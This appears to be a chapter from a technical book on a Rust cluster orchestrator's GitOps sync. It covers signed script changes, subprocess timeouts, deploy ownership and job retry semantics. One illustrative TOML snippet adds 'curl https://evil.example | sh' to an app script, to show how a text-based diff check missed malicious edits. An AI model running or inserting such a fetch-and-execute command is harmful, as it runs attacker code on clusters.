The same wrapper learned two more manners. A clone left over at the data path is now *checked* before it's reused — its `remote.origin.url` and tracked branch must still match the config — because a stale clone from a repointed `[gitops] repo`, or one left behind by a failover, would otherwise sync the wrong repository entirely. On a mismatch, Lettuce discards it and clones fresh. And the file merge, which used to `HashMap::extend` files in whatever order the hash felt like, now sorts by path first: two nodes handed the identical repo must converge on the identical config, and "last writer wins by hash order" is not a property you can reason about. A resource declared twice across files is reported as a duplicate against the later file rather than silently overwritten.

The listing itself uses `git ls-tree -r`, which always descends into subdirectories. For a while `[gitops]` still accepted a `recursive` flag that did nothing, and `recursive = false` earned a startup warning because it promised a shallow sync it never delivered. We kept it "so existing configs still parse". Before 0.1.0 there are no existing configs worth a shim, so the field is gone. `GitOpsConfig` has `#[serde(deny_unknown_fields)]`, so a leftover `recursive = ...` is now a parse error that names the key, which is louder and more honest than a warning scrolling past in the Bun log.

The static review in PR #258 (B17) found two ways that listing could shrink without anyone noticing, and in a reconciler a missing file is a deletion. First, plain `ls-tree` output is for humans: a path with a tab or a non-ASCII byte comes out C-quoted, so `café.toml` prints as `"caf\303\251.toml"`. That string doesn't end in `.toml`, so the loop skipped it, and every app it declared was removed on the next sync. Now the listing runs with `-z`, which prints raw paths terminated by NUL bytes, and the loop splits the bytes on zero rather than splitting a string into lines:

```rust
for entry in output.stdout.split(|byte| *byte == 0) {
    if !entry.ends_with(b".toml") {
        continue;
    }
    let name = std::str::from_utf8(entry).map_err(|_| /* … */)?;
```

`output.stdout` is a `Vec<u8>`, and `split` takes a closure (`|byte| *byte == 0`, Rust's lambda syntax) that marks the separators. `b".toml"` is a byte-string literal, a `&[u8; 5]` rather than a `&str`, so the suffix test works on raw bytes before we've decided they're text. Rust's `str` is always valid UTF-8, so turning bytes into one is a fallible `from_utf8`; a name that isn't valid UTF-8 fails the sync rather than being skipped. Second, a `.toml` whose `git show` failed was dropped from the result. It now fails the whole listing, because a partial desired state is exactly the thing that deletes apps. The tests build a real repository with `café.toml`, `tab\tname.toml` and a non-ASCII subdirectory and expect all of them back; another unpacks the clone's objects, deletes one blob and expects an error that names the file.

## A broken sync you can actually see

The last gap was quieter than the others, which is what made it dangerous. When a sync failed — the remote was unreachable, a commit didn't verify, a write was refused — the runner printed to stderr and moved on. Nothing in the cluster state changed. So `relish` and the dashboard, which read `SyncState` out of Raft, showed a sync that looked perfectly healthy while it had in fact been failing every thirty seconds for an hour.

Now every hard failure is recorded where the tools can see it:

```rust
async fn record_failure(council: &CouncilNode, desired: &DesiredState, error: &str) {
    let mut sync_state = desired.gitops_sync_state.clone().unwrap_or_default();
    sync_state.phase = SyncPhase::Error;
    sync_state.last_error = Some(error.to_string());
    sync_state.consecutive_failures = sync_state.consecutive_failures.saturating_add(1);
    sync_state.last_attempt_at = Some(now_millis());
    council.write(RaftRequest::GitOpsSyncUpdate(Box::new(sync_state))).await.ok();
}
```

`saturating_add` is worth a word for anyone coming from C: it adds, but clamps at the type's maximum instead of wrapping around to zero. A counter that silently resets to zero after enough failures would be a lie of its own, so we never let it overflow.

The failure count does double duty. It feeds a *back-off*: instead of retrying a broken remote every poll interval and tight-looping against a dead server, the runner waits `poll × 2^failures`, capped, before the next attempt. The `backoff_delay` function was already written and tested — it just had no caller. Wiring it in is the difference between a sync loop that degrades gracefully and one that spins. When a sync finally succeeds, the count resets to zero, the error clears, and the applied commit advances (the atomicity rule from earlier).

Success also stamps the *coordinator*: the runner records which node drove the sync, so the dashboard can show it. That node is always the leader, because only the leader can write to Raft and the sync loop is leader-gated. An earlier version picked a non-leader to "spread load" and so named a node that never ran a sync; Chapter 9's "Coordinator election" tells why we deleted it.

The test points the runner at a repo path that doesn't exist and waits for `SyncState` to carry a non-empty `last_error` and a non-zero failure count. Before the fix, it would wait forever: the failure never left stderr.

## Scripts are compared, not grepped

An app can carry an inline `script` instead of an image, and Bun runs it on a node. That makes a push to the GitOps repository a way to run code on the cluster, so Lettuce has a rule: a commit that changes a script needs a signature from a trusted key, even when `require_signed_commits` is off. The rule was right. The check behind it wasn't.

It asked `git diff` for the change and looked for an added line containing the word `script`. Here's a change it waved through:

```toml
[app.backup]
script = """
set -e
echo old
"""
```

becomes

```toml
[app.backup]
script = """
set -e
curl https://evil.example | sh
"""
```

The diff adds `curl https://evil.example | sh`. No added line mentions `script`, because the key sits in unchanged context two lines up. Deleting a script altogether added no line at all. And the exit status of `git diff` was never checked, so a diff that failed with empty output read as "no script changed". The static review (B13) listed all three, and each one is the same mistake: asking a question about *meaning* of a tool that only knows about *text*.

So now the check asks the meaning question directly. It parses every TOML file of the last applied tree and of the candidate tree, collects every value whose key is `script`, and compares the two collections:

```rust
fn collect_scripts(prefix: &str, table: &toml::Table, scripts: &mut BTreeMap<String, String>) {
    for (key, value) in table {
        let path = format!("{prefix}{key}");
        if key == "script" {
            scripts.insert(path.clone(), value.to_string());
        }
        collect_value(&path, value, scripts);
    }
}
```

`toml::Table` is the parsed file as a map from key to `toml::Value`, and `toml::Value` is an enum with one variant per TOML type (`String`, `Integer`, `Table`, `Array` and so on). `collect_value` matches on it and recurses into tables and arrays, so a `script` nested anywhere is found. The map is a `BTreeMap` keyed by `apps.toml:app.backup.script`, and comparing two of them with `!=` compares every key and value. Parsing is what makes the syntax irrelevant: a basic string, a `"""` block and a `'''` literal holding the same text parse to the same `String`, and an edited body is a different `String`, whichever line the key is on.

The other half of the fix is what "can't tell" means. If the previous tree can't be listed, read or parsed (a force-push removed the old commit, say), the comparison is incomplete, and the old code's habit of reading an error as "no change" is exactly what we're removing. An incomplete comparison is treated as a script change, so only a verified signature gets the commit through. On the very first sync there's no previous tree at all, so any script in the repository needs a signature. And `NotChecked`, the status you get when no trusted keys are configured and the verifier never runs, is refused like any other unverified status.

The tests build real repositories with an SSH signing key, generated by `ssh-keygen` in a temporary directory, and a clone whose `gpg.ssh.allowedSignersFile` trusts it. For each of a multiline body edit, a `'''` literal edit, a basic string edit, a deletion and an addition, an unsigned commit is refused with "no verified signature" and the same change signed is admitted. The first two and the deletion were admitted unsigned before. The negative control changes only `replicas` in a file that holds a script, unsigned, and is admitted: the rule is about scripts, not about files that happen to contain them.

## Reconciling when nothing changed

Here's a scenario the loop got wrong for its whole life. Git says `web` runs `web:v1`. Somebody runs `relish apply` with `web:rogue` by hand, or deletes `api`. The next poll fetches, finds the remote HEAD where it was, and returns `Skipped { reason: "HEAD unchanged" }`. So does the one after that, and every poll until someone pushes. The design doc promised that each sync reapplies Git's desired state to repair drift. The code only applied anything when Git moved (B16).

The skip was an optimisation that confused two questions. "Has Git changed?" decides whether there's a new commit to verify. "Does the cluster match Git?" decides whether there's anything to write. Only the second one matters for reconciliation, and it can't be answered without looking at the cluster. So `execute_sync` now always settles on a commit, the new one or the current HEAD, and always diffs its config against desired state:

```rust
let fetched = repo.fetch().and_then(|new_commit| match new_commit {
    Some(commit) => Ok(commit),
    None => repo.head_sha().and_then(|head| repo.commit_info(&head)),
});
```

`and_then` on a `Result` runs the closure only on `Ok` and passes its `Result` through, so any of the three `git` calls failing becomes one error without a nested `match`.

Reconciling every tick raises a cost question the old skip was hiding: if every poll ends in `record_success`, every poll writes a `GitOpsSyncUpdate` to Raft, and the log grows by one entry every thirty seconds forever. We already fixed that once (the fetch that never advanced its local ref, earlier in this chapter), so the runner is explicit about when it writes. A tick on the commit it already applied, with no changes and no error to clear, writes nothing. A tick that repaired drift writes a history entry and says so in the log (`gitops: repaired drift with 2 change(s) from …`). The applied commit doesn't move, because Git didn't.

Then there's what *isn't* drift. An autoscaler that has scaled `worker` to five replicas hasn't disagreed with Git, and neither has an operator who ran `relish stop`. Both live outside the app spec: the override in `autoscale_overrides`, the stop in `stopped_apps`. GitOps writes app specs, and only when the spec differs, so a matching spec leaves both alone. The integration test does the whole thing through Raft on a single-node council: sync a repo with three apps, write a rogue image for one, delete another and write an autoscale override for the third, then wait. The polls, on the same SHA, put `web:v1` and `api` back; the override survives, and `last_applied_commit` still names the original commit. Before the fix the test timed out waiting for the image.

## GitOps owns what it wrote, and nothing else

Reconciling on every tick made one old assumption much louder. The diff treated the repository as the whole truth: anything in Raft that git didn't mention was a `Remove`. That's fine in a cluster GitOps built from nothing. Now turn GitOps on in a cluster that's been running for a month on `relish apply`. The first sync reads a repository with three apps in it, compares it with a cluster running thirty, and deletes twenty-seven. Commit an empty tree by mistake and it deletes everything. The design doc promised that GitOps and manual apply coexist. The code had no way to tell the two apart, so they didn't.

The audit (#693) found two more ways to lose things. A running test's `rbtest-*` namespace sits in desired state like any other, so GitOps pruned the apps of a test in progress. And the `[gitops]` section came from each node's own `node.toml`, so after a failover the new leader could follow a different repository, or none at all, and prune whatever the old one had written.

### An ownership set, written with the resource

The maintainer's decision (D9) was an ownership marker: Raft records which resources Lettuce wrote, and Lettuce prunes only those. The interesting part is *where* the record gets written. If the runner wrote the app and then, in a second entry, marked it owned, a crash or leader change between the two would leave an app GitOps wrote but doesn't know it owns. It would never be pruned. So the ownership change rides in the same Raft entry as the write:

```rust
GitOpsWrite {
    term: u64,
    change: Box<RaftRequest>,
},
```

That's an enum variant holding a boxed value of its own enum. In C you'd reach for a pointer to a struct of the same type; in Rust the `Box` is what makes it legal at all. An enum is laid out inline, as big as its largest variant, so a variant that contained a `RaftRequest` directly would need infinite size. `Box` puts the inner request on the heap and leaves a pointer-sized field behind. Serde follows the box without noticing it's there.

The state machine unwraps it, checks the inner change is one of the six declarative writes (an app, namespace or permission, spec or delete), applies it through the ordinary handler, and then updates `gitops_owned`:

```rust
let response = self.apply_request_at(change, position);
if matches!(response, Some(CouncilResponse::Refused { .. })) {
    return response;
}
let owned = &mut self.state.gitops_owned;
match change {
    RaftRequest::AppSpec { app_id, .. } => {
        owned.apps.insert(app_id.clone());
    }
    // namespaces and permissions likewise
    _ => {}
}
```

A delete goes the other way: it's refused outright when GitOps doesn't own the resource, and the delete handler forgets the ownership (as a manual delete does, so the set only ever describes things that exist). Two `&mut` borrows of `self.state` can't overlap, which is why `owned` is taken only after `apply_request_at` has finished with `self`. The borrow checker would refuse the other order, and it'd be right to.

The diff then only removes what's in the set. A resource that's in git *and* already in the cluster, with the same spec, but that GitOps didn't write, gets a new kind of change, `ResourceChange::Adopt`, carrying the spec the cluster already runs. Writing it changes nothing (the bound image digest is kept, so no re-pull) except the ownership. From then on, deleting it from git deletes it from the cluster. Everything in an `rbtest-*` namespace is filtered out of both sides of the diff, and the state machine now refuses a plain `AppDelete` or `NamespaceDelete` in a namespace a live lease owns. The lease's cleanup carries the lease (`TestLeaseAppDelete`), so it's the only thing that can remove a running test's workload.

What about the person at the keyboard? `relish apply` of a GitOps-owned resource goes ahead and prints `warning: app 'web' in namespace 'default' is managed by GitOps; manual changes are reverted on the next sync`. `relish delete` and `relish rollback` of one are refused with a `409` unless you pass `--force`, because the next sync would undo them anyway. Refusing the pointless change is kinder than letting it quietly bounce back thirty seconds later.

### Every change gets its go

The earlier section made "applied" mean "all of it applied", and the first version of that rule stopped at the first failure. That's correct for the commit pointer and wrong for everything else. One app whose image won't bind blocked every change behind it, removals included, forever, because the commit never advanced and the next tick stopped at the same app. `apply_changes` now tries every change and returns a report instead of a `Result`:

```rust
pub struct ApplyReport {
    pub applied: usize,
    pub refused: Vec<String>,
    pub abandoned: Option<String>,
}
```

A sync with refusals is recorded as `SyncResult::PartialSuccess { errors }`, naming each offender in the sync status. The D12 rule survives: `last_applied_commit` moves only when `refused` is empty, so the next tick retries, and the idempotent writes make retrying cheap. The diff's order matters more now that partial syncs are normal: adds and updates go namespaces, permissions, apps (the order manual apply already used), and removals go apps, permissions, namespaces, so a namespace is never pulled out from under apps still being written into it.

### One configuration, held by the cluster

The `[gitops]` section moved into Raft as `DesiredState.gitops_config`. Every cluster node runs the sync loop; a follower only compares its own section with the cluster's and publishes the result, and the leader syncs whatever Raft holds. A node's `node.toml` seeds Raft once, through `GitOpsConfigSet { seed: true }`, which the state machine ignores when a configuration is already there. After that the cluster's copy wins. A node whose section differs says so in its log and in `relish wtf`, and is ignored. `relish gitops set` changes it, behind an Admin token and the audit log.

The awkward bit is credentials. A private repository means a token in the URL, and webhooks mean a shared secret, and neither belongs in a Raft log that every council member replicates and every snapshot copies. So `StoredGitOpsConfig::seal` lifts them out before the write and seals them with HKDF and AES-256-GCM under a key derived from the cluster master key, the same wrapping the CA keys get. No master key, no credentials: the seal refuses rather than storing them in clear.

### A sync that knows which term it's in

A sync reads desired state, then spends seconds (or minutes, on a slow remote) in `git`. If leadership moves to B and back to A meanwhile, A's diff is stale: B may have changed things A's snapshot never saw. The fix costs one `u64`. The runner reads the Raft term *before* the snapshot and stamps it on every `GitOpsWrite`. The state machine compares it with the term of the log entry carrying the write, which openraft gives us for free in the entry's `LogId`, and refuses a mismatch. Because the check happens as the entry applies, every replica refuses the same writes. The runner also checks the term before each write and abandons the sync on the first sign it moved; the new leader's sync takes over.

### Warning, not refusing, about plaintext secrets

Last, a smaller decision (D8). A repository with `DB_PASSWORD = "hunter2"` in it works, and always has. Refusing it would turn a bad habit into an outage with no migration path. So the sync applies it and warns: any env key containing `PASSWORD`, `SECRET`, `TOKEN` or `CREDENTIAL`, or ending in `_KEY`, whose value isn't `ENC[AGE:...]`, produces a warning naming the app and the key, never the value. It lands in the log (once, when the set of warnings changes), in `SyncState.warnings` and in `relish wtf`.

The tests follow the findings. In `diff.rs`, `diff_never_removes_resources_gitops_did_not_write`, `diff_skips_test_lease_namespaces` and `diff_orders_namespaces_before_apps_and_removes_in_reverse`. In the state machine, `gitops_write_records_ownership`, `prune_clears_ownership`, `a_gitops_write_from_an_earlier_term_is_refused` and `app_delete_in_a_leased_namespace_needs_the_lease`. In the runner, `one_refused_change_does_not_block_the_others`, `partial_sync_names_every_offender` and `sync_is_abandoned_when_the_term_changed`. And end to end on a real council in `tests/suite/gitops.rs`: `enabling_gitops_keeps_manually_applied_apps` (the thirty-apps scenario, in miniature), `manual_apply_of_a_gitops_app_warns`, `delete_of_a_gitops_app_refuses_without_force`, `gitops_config_in_raft_survives_a_leader_without_local_config` and `differing_local_gitops_config_is_reported_not_used`.

`scripts/demo/gitops.sh` shows the same thing to a person. It pushes `examples/gitops/repository` (a `_defaults.toml` and two directories, `shop/` and `ops/`, that become namespaces) to a `file://` bare repository, applies an app by hand, and only then turns GitOps on with `relish gitops set examples/node/gitops.toml`. The sync creates the repository's two apps and leaves the hand-applied one where it is. `relish delete` of a GitOps app is refused. Deleting the file from the repository deletes the app from the cluster, and the hand-applied app survives that sync too. `tests/demos.rs` runs both demos under `make test-cluster`, so a demo that stops matching the product fails a gate instead of a talk. It paid for itself on the first CI run. The demo picked rows out of `relish status` with `awk -v namespace=shop`, which macOS's awk accepts and GNU awk 5 refuses outright (`namespace` is a gawk keyword), so on Linux the check never matched and the demo timed out waiting for an app that was running all along. It reads the columns with bash's own `read` now.

## Stopping the work, not just the wait

Every `git` call in Lettuce used `Command::output()`, which waits for the child for as long as the child likes. A remote that accepts the connection and then says nothing, a credential helper waiting for a password on a terminal nobody's watching, a GnuPG `pinentry` asking for a passphrase: any of them held the sync loop forever (B19). There's one loop, so polling stopped, webhooks queued, and shutdown sat waiting on a `spawn_blocking` task that would never return.

The tempting fix is a timeout around the task:

```rust
tokio::time::timeout(Duration::from_secs(120), tokio::task::spawn_blocking(sync)).await
```

It compiles, the loop comes back, and the problem is still there. A Rust future is inert until polled and does nothing on its own once it's dropped, which is the whole point of cancellation in async Rust: dropping a future cancels *it*. It doesn't cancel what it started. The blocking thread is still inside `output()`, and the `git` child is still running, still holding its lock on the clone, and the next sync collides with it. Go programmers have met this as a `context.Context` that the callee never checks. The deadline has to reach the thing doing the work.

So every `git` call goes through `lettuce::subprocess::run_bounded`, which owns the child from spawn to reap:

```rust
let mut child = command.spawn()?;
let stdout = spawn_reader(child.stdout.take(), Arc::clone(&overflow));
let stderr = spawn_reader(child.stderr.take(), Arc::clone(&overflow));

let stopped = wait_within(&child, budget, &overflow);

kill_group(&child);
let status = child.wait()?;
```

Four decisions are packed into that.

**The child gets its own session.** Before `exec`, a `pre_exec` hook calls `setsid()`. The child becomes the leader of a new session and a new process group, with no controlling terminal. No terminal means `ssh` and `gpg` can't open `/dev/tty` to ask anything, and one process group means one `killpg` reaches every descendant. `pre_exec` is `unsafe` because the closure runs in the forked child before `exec`, where only async-signal-safe calls are allowed; `setsid` is one, and the `// SAFETY:` comment says so. The environment switches off the prompts that don't need a terminal: `GIT_TERMINAL_PROMPT=0`, `GCM_INTERACTIVE=never` and `SSH_ASKPASS_REQUIRE=never`.

**Output is read on threads, with a cap.** Waiting on a child whose pipes nobody drains deadlocks as soon as it fills the pipe buffer, so two plain `std::thread`s read stdout and stderr. We're already inside `spawn_blocking`, off the async runtime, so ordinary threads are the right tool. Each reads through `Read::take(limit)`, which stops after 32 MiB, and sets an `AtomicBool` (a boolean that several threads can read and write without a lock) when a stream goes over.

**Waiting never reaps.** `wait_within` polls three things: the deadline, the shutdown `CancellationToken`, and whether the child has exited. The last one is subtle. `Child::try_wait` would reap the child, and a reaped child's pid can be handed to a new process, but we still need that pid, because it's the process-group id we're about to kill. So the helper asks `waitid` with `WNOWAIT`, which reports "exited" and leaves the zombie in place. That's another small `unsafe` block around a C call, with the usual comment about the `siginfo_t` it writes into.

**The group dies whatever happened.** On timeout, on cancellation, on overflow, and also on a clean exit, the helper sends `SIGKILL` to the group and only then reaps the child. Killing after a clean exit sounds excessive until you meet a helper that forks a daemon and exits: the daemon holds the stdout pipe, and a reader waiting for end of file waits as long as the daemon lives. Killing an already-exited child is a no-op, so a clean exit keeps its real status. If a descendant escaped the group with its own `setsid`, its pipe can still stay open; the reader gets one second of grace, and after that the call fails with "left a process holding its output open" rather than pretending the output was complete.

One `killpg` isn't quite enough, though. A member that was in the middle of `fork` when the signal went out can produce a child the signal missed, and the leader itself may still be forking until the moment it dies. So after reaping, the helper sweeps: it sends `SIGKILL` to the group again, and again, until `killpg` answers `ESRCH` (no such group), for at most a second. Is it safe to signal a group whose leader we've just reaped? Yes, because POSIX never reuses a pid while a process group still carries it as its id, so the id still means our group for as long as anything is in it. The first `ESRCH` ends the sweep, and we never touch that id again. A unit test cancels a shell that forks a new sleeper every few milliseconds and then asks `killpg(group, None)` (signal 0, which checks without sending anything) whether anyone is left. Before the sweep it found survivors about once in 70 runs.

`GitRepo` carries the limits as a `CommandBudget`, and the runner builds one from the node's shutdown token:

```rust
let budget = CommandBudget {
    cancel: shutdown.clone(),
    ..CommandBudget::default()
};
```

The `..CommandBudget::default()` is *struct update syntax*: take every field not listed from another value of the same type. Here that's the default 120-second timeout. Shutdown now has a real path to every child. The runner still awaits the blocking task, and that's deliberate: the task returns promptly because its child was killed, and awaiting it means the child is reaped before the loop exits rather than abandoned mid-kill.

The tests make `git fetch` hang for real. `remote.origin.uploadpack` tells git which program to run on the "remote" side of a local fetch, so the tests point it at a shell that records a pid, leaves a sleeping descendant behind and never exits (a trailing `#` comments out the repository path git appends). The pid goes to a temporary file that is then renamed into place. The obvious `echo $$ > pid` has a race in it: the shell creates the file for the redirection before `echo` writes anything, and on a loaded machine the test once read it empty and failed to parse "" as a pid. A rename is atomic, so the file never exists half-written, and the test also waits until the contents parse rather than until the file merely exists. With a 1.5-second budget, the fetch fails with "git fetch timed out", the descendant is gone, and after unsetting the option the next fetch succeeds. Cancelling the token half a second into a 300-second budget fails the fetch as "cancelled" at once. In the suite, a real sync loop gets stuck on that fetch; cancelling shutdown must end the loop's `JoinHandle` within five seconds, which is why `spawn_gitops_sync` now returns one. The helper has its own unit tests too: a child that never exits, one that leaves a descendant holding stdout, runaway output from `yes`, and a check that the child really has no terminal to open.

## Namespaces that actually say no

There's a nice pay-off from making namespaces real desired state. Back when we built the scheduler, it already had a quota ledger — a per-namespace accountant that checks whether admitting an app would bust its CPU, memory, GPU, or replica budget. It was wired, tested, and completely inert, because it was fed an empty table: namespaces weren't desired state yet, so there were no budgets to enforce.

Now they are. The scheduling pass builds its ledger straight from the desired-state namespaces:

```rust
let mut quotas = crate::meat::quota::ledger_from_namespaces(&desired.namespaces);
```

Declare a namespace with `cpu = "2000m"`, apply an app that wants three replicas at 800 millicores each, and the scheduler does the arithmetic — 2,400 > 2,000 — and refuses the placement with a clear reason in the log, instead of over-committing the budget you set. A namespace with headroom admits the same app without complaint. The enforcement was built and proven long ago; all this theme did was hand it the numbers.

## A deploy owns what it starts

A later audit went looking for every place where a deploy said "done" before it was. There were a lot of them, and they all had the same shape: a step reported success, and something (a process, a port, a file, a route) was left with nobody responsible for it. So the rule we settled on is simple to say. A deploy *owns* everything it starts: the replacement containers, their ports, their on-disk adoption records, their routes. It keeps each of those in the supervisor until it has seen, with its own eyes, that the thing is gone. A failure never releases ownership; it just stops the deploy and leaves the leftovers where Stop or Retire can find them.

Start with the hole the stop listing above left open. Here's what the retire path uses now:

```rust
/// Preserve ownership until both force-kill and observed runtime exit succeed.
async fn kill_runtime_instance<G: Grill>(
    grill: &G,
    id: &InstanceId,
    confirmation_timeout: std::time::Duration,
) -> Result<(), BunError> {
    tokio::time::timeout(confirmation_timeout, grill.kill(id))
        .await
        .map_err(|_| BunError::StopUnconfirmed {
            instance_id: id.clone(),
            reason: "force-kill request timed out",
        })??;
    if observe_runtime_exit(grill, id, confirmation_timeout).await? {
        return Ok(());
    }
    Err(BunError::StopUnconfirmed {
        instance_id: id.clone(),
        reason: "runtime did not confirm exit after force-kill",
    })
}
```

That `??` looks like a typo, but it isn't. `tokio::time::timeout` wraps a future and gives back a `Result` of its own: `Err(Elapsed)` if time ran out, otherwise `Ok(...)` containing whatever the inner future returned, which is another `Result`. So we have `Result<Result<(), BunError>, Elapsed>`. The `map_err` turns the outer error into a `BunError`, the first `?` unwraps the timeout layer, and the second `?` unwraps `kill`'s own result. Either failure returns early. The trailing `observe_runtime_exit` asks the runtime again, because a successful signal isn't a stopped process. Rolling, blue-green, rollback and plain `relish stop` all go through this helper, so they can't drift apart again.

How long should Bun wait for the runtime? The first version hard-coded two seconds, and CI caught it out. On a busy runner `runc kill` alone took longer than that: it's a fork and exec of a Go binary that reads its state file and signals through the kernel, and every one of those steps queues behind whatever else the host is doing. A process stuck in uninterruptible I/O doesn't even die on `SIGKILL` until the I/O completes. The stop wasn't wrong, just slow, and Bun reported "stop not confirmed" and kept ownership of a container that was about to exit anyway. So the deadline is now `[runtime] stop_confirmation_timeout_secs`, read once at startup and threaded down to every stop and kill. It defaults to ten seconds, five times the budget CI outran. We didn't go higher because some of these waits run on the agent's command loop, which can spend up to two deadlines on one wedged instance (the kill request, then the exit check), and twenty seconds still sits inside the thirty-second window before a council marks a silent node's report stale. A test gives `MockGrill` a five-second kill and checks the default waits it out, while a two-second deadline still reports the stop as unconfirmed.

When it fails, the deploy worker emits an error instead of `Complete`, and both generations stay in ordinary supervision. The same goes for everything after the process exits. Deleting the identity directory and the adoption record returns `Result<(), BunError>` over the command channel. `()` is Rust's unit type (think `void`, but as a real value), so success carries no payload and failure explains which instance still has work outstanding. Only when both deletions succeed do we release the port and forget the instance. Rollback follows the same rule, and history tells the truth about it: `RolledBack` only when every replacement is confirmed gone, `Halted` when some old instances had already retired, `Failed` when cleanup couldn't be confirmed.

Several smaller races had the same flavour:

- **An error event isn't the end.** The worker reports an error *before* it rolls back. Releasing the app's deploy lock at that moment let a corrective deploy start while the old worker was still killing containers. Two owners, one workload. The observer now waits on the worker task's `JoinHandle` (the Tokio equivalent of joining a thread) before it writes history and releases the lock. A panicked worker is recorded as `Unknown`, whatever it said earlier.
- **Cancel is a request.** `relish cancel-deploy <id>` signals a `CancellationToken` and waits for the worker to notice. The worker checks it at safe points: health waits are read-only, so `tokio::select!` can abandon them, but a `create`, `start` or cleanup call always finishes first. The operation becomes `Cancelled` only after the worker returns. It cancels one node's attempt and doesn't touch Raft's desired state, so apply the corrected config too.
- **Tell the restart driver first.** Between our `kill` and our observing the exit, the one-second crash detector could see an instance marked `Running` exit unexpectedly and restart it. The worker now sends `BeginRetire`, which marks the instance `Stopping` and turns off retries, before it signals anything.
- **Names must not collide.** An app and a job called `web` in the same namespace both mapped to `default__web-0`, so config validation now requires distinct names. An app called `worker-g1` could collide with generation one of `worker`, so fresh deploys check every proposed ID against existing owners. After a self-upgrade, the generation counter restarts in memory, so it now starts above every adopted instance's generation, using checked arithmetic that errors instead of wrapping. Each generation also gets its own cgroup (`web/0`, `web/g7-0`): when two generations shared one, removing the old group stopped the new container as well.
- **Routes are confirmed before they're published.** The replacement's backend goes into the kernel map first; only if that works does the new map reach DNS and Wrapper. The kernel map has 32 backend slots in each node's consumer pool. The service catalogue retains every replica, so DNS and Wrapper can see replica 33 and beyond. Each node picks its bounded pool deterministically from healthy backends, preferring local ones; its stable node identity spreads remote choices across consumers. A client using the kernel map can reach that node's selected pool, rather than every replica at once. The earlier replica-33 failure was first turned into a deploy error; the bounded pool now removes that catalogue-wide limit. Ordinary stops and automatic restarts also drain in-flight requests the way a rollout does.
- **Keep the evidence cleanup needs.** Finalising a rollout rebuilds the app's local service entry: unregister it, then register it again against the council's committed allocation. If `relish stop` lands mid-rollout, the council has already withdrawn that allocation, so the second step refuses, and the first has thrown away the entry the retained replacement's cleanup needs. Bun only releases a container address once the live service map proves its backend is gone (see [Writing it down before doing it](03-talking-to-each-other.md#writing-it-down-before-doing-it)), and with no entry there's nothing to prove it against. The orchestrator retried the stop on every two-second tick, failing with "original service withdrawal is unproven" each time. It took a crash, a recovery that redeployed and a badly timed stop to hit, which is why it showed up in CI once and never in eight runs in the VM. Finalisation now keeps a `clone()` of the map from before the rebuild and puts it back if the rebuild refuses. Rust never copies heap data behind your back, so `clone()` is an explicit deep copy; for a few dozen services it's cheap, and much simpler than undoing a half-finished rebuild step by step.
- **A failed attempt mustn't leave work for the retry.** The V02 soak restarted every node and then applied its workloads. One node got the deploy for `soak-redis` before the council's allocation for it reached its view, so registering the service refused ("local service requires its committed cluster allocation"). That's fine on its own: the orchestrator retries with backoff. The trouble was what the first attempt left behind. It had already created a `Pending` instance, so the retry saw an existing owner and ran a *rollout*, for a service this node had never published. The replacement's container address was held by the runtime, but recording that hold in the discovery journal refused (the journal won't track an address for a service it has no entry for), and the agent only remembers a hold once the journal has it. Every later attempt then tried to retire that replacement and found a hold that nothing tracked, and Bun refuses to release an address it can't account for ("retained network reference requires original discovery reconciliation"). Seven attempts, then nothing. Three changes fix it. A fresh deploy whose registration fails forgets the instances it just created, as long as they never left `Pending` and the registration left no reservation behind, so the retry is another fresh deploy. A refused journal write hands the runtime's hold straight back, since a refusal decided in memory never reached disk. And retirement now asks the journal about a hold it doesn't remember. The answer is a three-variant enum, `Recorded`, `Unrecorded` or `Unknown`, rather than a `bool`, because "the journal is authoritative and says no" and "I can't tell" call for opposite actions. Launches only happen after the journal records their hold, so an unrecorded one belongs to an instance that never started and no route can name it: Bun releases it. A disabled or uncertain journal still refuses, as before.
- **Wait for the allocation instead of failing on it.** That fix made the failed attempt harmless, but it was still a failed attempt, with a five-second backoff and a scary line in the log. The 0.1.0 soak kept printing it, once right after a deploy on the same node had timed out, which made the timeout look guilty. It wasn't. The leader writes an app's placement and its catalogue allocation to the council separately, and the catalogue write can lag or be refused ("endpoint publication generation changed"), so a node's poll can say "run `web` here" while the catalogue it arrived with has no `web` in it. The reconciler now checks that before deploying: a placement whose port the catalogue doesn't allocate yet is skipped, logged once, and deployed from a later poll. It isn't a failure, so it doesn't count towards the backoff. The first version of this check broke two cluster tests: their workers run without discovery ownership, allocate services locally, and never see a catalogue, so they waited forever for an allocation they didn't need. The agent now says which kind it is in its reply to each catalogue sync (`requires_allocations` on `ConsumerUpdate`), and only an agent that registers at committed allocations makes its placements wait. The check is one `Option` method, `resolve(&service).is_none_or(|allocation| allocation.port != port)`: `is_none_or` is true for `None` and otherwise runs the closure, which also catches an allocation still at the old port after a port change. The test answers the reconciler's poll with exactly that state and failed first with the soak's own error line.
- **Replacements are recorded before they serve.** A replacement's adoption record is written before its health wait, so a bun that dies mid-rollout adopts it instead of leaking it. Replacements now run their init containers too; they used to skip them.

Most of these were found by tests that hold a runtime call open (a `kill` that doesn't return, a `create` that hangs) and then poke the agent from another direction. When every mock call returns instantly, you never see the interleavings. What they don't prove is recovery from a power cut mid-rollout; we test controlled interruption, not arbitrary crashes.

## Jobs that might already have run

Apps are easy to recover: if a web server's fate is unclear, you start it again. Jobs aren't. A job that sends invoices, migrates a schema or charges a card must not run twice just because bun crashed at an awkward moment. So every attempt ends in an outcome that's honest about what it doesn't know (from `src/bun/task_executor.rs`, trimmed):

```rust
pub enum AttemptOutcome {
    /// The process exited with this code; 0 is success.
    Exited { code: i32 },
    /// The process was killed by a signal it didn't choose.
    Signalled { signal: i32 },
    /// The attempt ran past the task timeout and was killed.
    TimedOut,
    /// Refused before its command ran: retrying can't fix the spec.
    Refused { reason: String },
    /// The runtime failed before the command ran, so a retry can't run it twice.
    LaunchFailed { reason: String },
    /// Execution may have occurred, but its exit status could not be established.
    Unknown { reason: String },
    /// The array was cancelled while the attempt ran.
    Cancelled,
}
```

The variants that carry data are little structs inside the enum, and `match` won't let you read `code` without first proving the attempt `Exited`. The distinction that matters here is between `LaunchFailed` and `Unknown`. A launch failure happened before the command was authorised to run, so retrying it is safe. Once the command was authorised, a failure to learn how it ended is `Unknown`: it might have charged the card. Unless the job sets `replay_unknown = true`, an `Unknown` or a timeout stops the run instead of retrying it. Bun never guesses "probably failed, let's retry".

The first version of this lived in the agent, as a per-job checkpoint with its own `Preparing`, `Launching` and `Unknown` phases. In 0.2.0 every job moved onto the common lifecycle of Chapter 17 and the agent stopped running jobs itself, but the rule came along unchanged.

